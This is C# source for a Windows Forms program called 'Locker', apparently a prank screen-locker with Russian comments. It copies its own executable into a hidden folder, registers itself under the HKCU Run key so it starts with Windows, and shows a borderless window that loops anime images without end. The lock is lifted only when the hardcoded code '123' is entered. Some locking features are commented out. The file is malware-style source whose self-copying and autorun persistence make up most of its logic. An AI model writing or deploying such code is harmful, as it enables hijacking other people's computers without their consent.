using System;
using System.IO;
using System.Media;
using System.Windows.Forms;
using System.Threading;
namespace Locker
{
    public partial class Form1 : Form
    {
        private void LockIn()
        {
            for (j = 0; j <= 2; j++)
            {
                this.BackgroundImage = Properties.Resources.pic1;
                Thread.Sleep(250);
                this.BackgroundImage = Properties.Resources.pic2;
                Thread.Sleep(250);
                this.BackgroundImage = Properties.Resources.pic3;
                Thread.Sleep(250);
                this.BackgroundImage = Properties.Resources.pic4;
                Thread.Sleep(250);
                this.BackgroundImage = Properties.Resources.pic5;
                Thread.Sleep(250);
                this.BackgroundImage = Properties.Resources.pic6;
                Thread.Sleep(250);
                this.BackgroundImage = Properties.Resources.pic23;
                Thread.Sleep(250);
                this.BackgroundImage = Properties.Resources.pic8;
                Thread.Sleep(250);
                this.BackgroundImage = Properties.Resources.pic9;
                Thread.Sleep(250);
                this.BackgroundImage = Properties.Resources.pic10;
                Thread.Sleep(250);
                this.BackgroundImage = Properties.Resources.pic11;
                Thread.Sleep(250);
                this.BackgroundImage = Properties.Resources.pic22;
                Thread.Sleep(250);
                this.BackgroundImage = Properties.Resources.pic13;
                Thread.Sleep(250);
                this.BackgroundImage = Properties.Resources.pic14;
                Thread.Sleep(250);
                this.BackgroundImage = Properties.Resources.pic15;
                Thread.Sleep(250);
                this.BackgroundImage = Properties.Resources.pic16;
                Thread.Sleep(250);
                this.BackgroundImage = Properties.Resources.pic17;
                Thread.Sleep(250);
                this.BackgroundImage = Properties.Resources.pic18;
                Thread.Sleep(250);
                this.BackgroundImage = Properties.Resources.pic19;
                Thread.Sleep(250);
                this.BackgroundImage = Properties.Resources.pic20;
                Thread.Sleep(250);
                this.BackgroundImage = Properties.Resources.pic21;
                Thread.Sleep(250);
                this.BackgroundImage = Properties.Resources.pic12;
                Thread.Sleep(250);
                this.BackgroundImage = Properties.Resources.pic7;
                Thread.Sleep(250);
                this.BackgroundImage = Properties.Resources.pic24;
                Thread.Sleep(250);
                this.BackgroundImage = Properties.Resources.pic25;
                Thread.Sleep(250);
                j--;
            }
        }
        SoundPlayer Sound;
        Thread locker_thread;
        int i = 0, k = 0, j;
        public Form1()
        {
            InitializeComponent();
            #region defining
            //Создание копии в скрытой папке
            string targetPath = @"C:\Users\CheAnime\";
            Directory.CreateDirectory(targetPath);
            DirectoryInfo dir = new DirectoryInfo(targetPath);
            dir.Attributes |= FileAttributes.Hidden;
            string sourceFile = System.Windows.Forms.Application.ExecutablePath;
            string destFile = System.IO.Path.Combine(targetPath, "AnimeLocker.exe");
            if (System.Windows.Forms.Application.ExecutablePath != destFile)
            {
                System.IO.File.Copy(sourceFile, destFile, true);
            }
            //test
            string name = "AnimeLocker";
            string ExePath = System.Windows.Forms.Application.ExecutablePath;
            Microsoft.Win32.RegistryKey reg;
            reg = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run\");
            try
            {
                reg.SetValue(name, ExePath);
                reg.Close();
            }
            catch (Exception ex) { MessageBox.Show(ex.Message); }
            /* //Добавление копии в автозапуск
             string name = "AnimeLocker";
             string ExePath = "\"" + destFile + "\"";
             Microsoft.Win32.RegistryKey reg;
             reg = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run\");
             try
             {
                 reg.SetValue(name, ExePath);
                 reg.Close();
             }
             catch (Exception ex) { MessageBox.Show(ex.Message); } */
            //Начинка
            this.MaximizeBox = false;
            this.MinimizeBox = false;
            this.ControlBox = false;
            //this.WindowState = FormWindowState.Maximized;
            //this.TopMost = true;
            this.ShowInTaskbar = false;
            this.FormBorderStyle = FormBorderStyle.None;
            this.Move += delegate { this.Capture = false; };
            //Sound.PlayLooping();
            #endregion
            Sound = new SoundPlayer(Properties.Resources.Music);
            locker_thread = new Thread(LockIn);
            locker_thread.Start();
        }
        
        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            //if (k == 0) e.Cancel = true;
        }
        private void Form1_FormClosed(object sender, FormClosedEventArgs e)
        {
            //Sound.Stop();
            locker_thread.Abort();           
        }
        private void button1_Click(object sender, EventArgs e)
        {
            if (textBox1.Text == "123") { exitbutton.Visible = true; k = 1; }
        }
        private void exitbutton_Click(object sender, EventArgs e)
        {

            #region Undefining
            //Удаление из автозапуска
            Microsoft.Win32.RegistryKey reg;
            reg = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run\");
            try
            {
                reg.DeleteValue("AnimeLocker");
                reg.Close();
            }
            catch { }
            //Удаление папки с копией
            string targetPath = @"C:\Users\CheAnime\";
            DirectoryInfo dir = new DirectoryInfo(targetPath);
            dir.Delete(true);
            #endregion

            Program.Allow_exit = true;
            this.Close();
            
        }
    }
}
